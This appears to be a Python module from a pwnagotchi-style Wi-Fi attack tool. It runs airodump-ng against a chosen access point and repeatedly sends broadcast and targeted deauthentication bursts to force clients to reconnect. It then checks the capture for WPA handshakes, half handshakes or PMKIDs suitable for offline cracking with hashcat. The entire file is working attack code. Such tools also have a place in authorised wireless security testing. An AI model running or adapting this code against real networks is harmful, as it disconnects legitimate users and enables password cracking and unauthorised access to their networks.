import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path

from rich import print as rprint

import deauth as deauth_mod


def _sanitize_essid(essid):
    """Strip special chars from ESSID for use in filenames."""
    essid = re.sub(r"[^\w\-]", "_", essid)
    return essid[:32]


def _pcap_filename(essid, bssid, output_dir):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bssid_clean = bssid.replace(":", "")
    name = f"{_sanitize_essid(essid)}_{bssid_clean}_{ts}"
    return os.path.join(output_dir, name)


def analyze_capture(pcap_path):
    """
    Inspect a pcap for crackable WPA material, the way pwnagotchi does.

    Returns a dict: {eapol: int, pmkid: bool, handshake: bool}.
    Following pwnagotchi, we treat *any* of the following as a usable capture:
      - a full 4-way handshake (>=4 EAPOL frames)
      - a half handshake (>=2 EAPOL frames — still crackable by hashcat)
      - a PMKID (carried in the AP's first EAPOL frame; no client needed)
    """
    result = {"eapol": 0, "pmkid": False, "handshake": False, "error": None}
    try:
        from scapy.all import rdpcap, EAPOL  # type: ignore
        packets = rdpcap(pcap_path)
    except BaseException as e:
        # scapy can raise low-level (non-Exception) errors on some installs;
        # never let handshake inspection crash the capture loop. Surface the
        # error so a broken scapy isn't mistaken for "no handshake captured".
        result["error"] = str(e) or e.__class__.__name__
        return result

    for pkt in packets:
        if not pkt.haslayer(EAPOL):
            continue
        result["eapol"] += 1
        if _frame_has_pmkid(pkt):
            result["pmkid"] = True

    # Half handshake (>=2 EAPOL) or PMKID is enough crackable material.
    result["handshake"] = result["eapol"] >= 2 or result["pmkid"]
    return result


def _frame_has_pmkid(pkt):
    """Detect an RSN PMKID KDE inside an EAPOL-Key frame's key data."""
    try:
        raw = bytes(pkt)
    except Exception:
        return False
    # RSN PMKID KDE: OUI 00-0F-AC, type 04. Present in EAPOL message 1 key data.
    # A raw scan is more robust across scapy versions than layer walking.
    return b"\x00\x0f\xac\x04" in raw


def _clients_for_bssid(csv_path, bssid):
    """Parse the airodump capture CSV for stations associated with bssid."""
    clients = set()
    try:
        with open(csv_path, "r", errors="replace") as f:
            content = f.read()
    except Exception:
        return clients

    sections = re.split(r"\r?\n\s*\r?\n", content)
    if len(sections) < 2:
        return clients

    station_lines = sections[1].strip().splitlines()
    bssid_up = bssid.upper()
    for line in station_lines[1:]:  # skip header
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 6:
            continue
        station = parts[0].strip().upper()
        assoc = parts[5].strip().upper()
        if assoc == bssid_up and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", station):
            clients.add(station)
    return clients


def start_capture(monitor_iface, bssid, channel, essid, output_dir="pcaps/",
                  timeout=180, deauth_count=8):
    """
    Capture WPA handshake material for one target, pwnagotchi-style:

    - lock airodump-ng to the target's channel/BSSID (writes both pcap + CSV)
    - send an association-triggering broadcast deauth, plus targeted deauths to
      each associated client we discover from the CSV
    - poll the pcap for a full handshake, half handshake, or PMKID

    Returns (success: bool, pcap_path: str).
    """
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    output_prefix = _pcap_filename(essid, bssid, output_dir)
    cap_path = output_prefix + "-01.cap"
    csv_path = output_prefix + "-01.csv"

    rprint(f"[cyan][*] Starting capture on {essid} ({bssid}) channel {channel}[/cyan]")

    proc = subprocess.Popen(
        [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", output_prefix,
            "--output-format", "pcap,csv",
            monitor_iface,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    start_time = time.time()
    success = False
    seen_clients = set()

    try:
        # Kick with a broadcast deauth right away.
        deauth_mod.deauth_burst(monitor_iface, bssid, count=deauth_count)

        while time.time() - start_time < timeout:
            time.sleep(5)
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)

            # Discover associated clients and deauth them specifically.
            clients = _clients_for_bssid(csv_path, bssid)
            for client in clients:
                deauth_mod.deauth_burst(monitor_iface, bssid, client=client,
                                        count=deauth_count)
            seen_clients |= clients

            # Also periodically re-send a broadcast deauth.
            if not clients:
                deauth_mod.deauth_burst(monitor_iface, bssid, count=deauth_count)

            status = analyze_capture(cap_path) if os.path.exists(cap_path) else \
                {"eapol": 0, "pmkid": False, "handshake": False, "error": None}
            rprint(
                f"[cyan][*] ({mins}:{secs:02d}) clients={len(seen_clients)} "
                f"eapol={status['eapol']} pmkid={status['pmkid']}[/cyan]"
            )
            if status.get("error"):
                rprint(
                    f"[yellow][-] pcap inspection error (scapy): {status['error']}. "
                    f"EAPOL count may be wrong — check {cap_path} manually.[/yellow]"
                )

            if status["handshake"]:
                success = True
                kind = "PMKID" if status["pmkid"] else (
                    "handshake" if status["eapol"] >= 4 else "half-handshake"
                )
                rprint(f"[green][+] Captured {kind}![/green]")
                break
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    if success:
        final_path = output_prefix + ".pcap"
        try:
            os.rename(cap_path, final_path)
            cap_path = final_path
        except OSError:
            pass
        rprint(f"[green][+] Saved to {cap_path}[/green]")
    else:
        rprint(f"[red][-] Timeout reached for {essid} — no crackable material captured[/red]")

    return success, cap_path


# Backwards-compatible alias for the older name.
def check_handshake(pcap_path):
    return analyze_capture(pcap_path)["handshake"]
